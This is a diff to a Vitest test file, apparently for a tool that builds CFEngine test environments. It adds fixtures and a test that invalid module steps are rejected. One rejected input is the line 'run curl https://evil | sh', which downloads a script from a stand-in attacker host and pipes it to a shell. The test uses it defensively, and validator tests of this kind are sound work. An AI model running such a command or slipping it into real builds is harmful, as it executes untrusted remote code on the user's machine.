@@ -26,6 +26,8 @@ const invoke = invoker(state.handlers);
 const stream = vi.mocked(startSidecarStream);
 const query = vi.mocked(testEnvQuery);
 const environment = { id: 'env1', hosts: [] };
+const policyModule = { name: './web.cf', steps: ['copy ./web.cf services/cfbs/web.cf', 'policy_files services/cfbs/web.cf', 'bundles web'] };
+const content = { project: { files: [] }, modules: [policyModule, { name: './lib/', steps: ['directory ./ services/cfbs/lib/'] }] };
 
 beforeEach(() => {
   state.handlers.clear();
@@ -84,10 +86,23 @@ describe('testenv:start', () => {
   });
 
   it('passes the masterfiles version to builds only', async () => {
-    await invoke('testenv:start', 'test', { environment, masterfiles: '3.27.1-2' });
-    await invoke('testenv:start', 'reset', { environment, masterfiles: 'master' });
+    await invoke('testenv:start', 'test', { environment, content, masterfiles: '3.27.1-2' });
+    await invoke('testenv:start', 'reset', { environment, content, masterfiles: 'master' });
     await invoke('testenv:start', 'stop', { environment, masterfiles: '/Users/me/Documents' });
     expect(started().map(({ input }) => input.masterfiles)).toEqual(['3.27.1-2', 'master', undefined]);
+  });
+
+  it.each([
+    ['a run step', { ...policyModule, steps: [...policyModule.steps, 'run curl https://evil | sh'] }],
+    ['a step that isn’t a string', { ...policyModule, steps: [['run', 'x']] }],
+    ['a module to fetch', { ...policyModule, name: 'evil-module' }],
+    ['a module without steps', { name: './web.cf' }]
+  ])('builds only the builder’s own module steps, not %s', async (_, module) => {
+    await expect(invoke('testenv:start', 'run', { environment, masterfiles: 'master', content: { ...content, modules: [module] } })).rejects.toThrow(
+      'Invalid project content'
+    );
+    await expect(invoke('testenv:start', 'run', { environment, masterfiles: 'master' })).rejects.toThrow('Invalid project content');
+    expect(stream).not.toHaveBeenCalled();
   });
 
   it('cancels a run, and every run still going when the app quits', async () => {
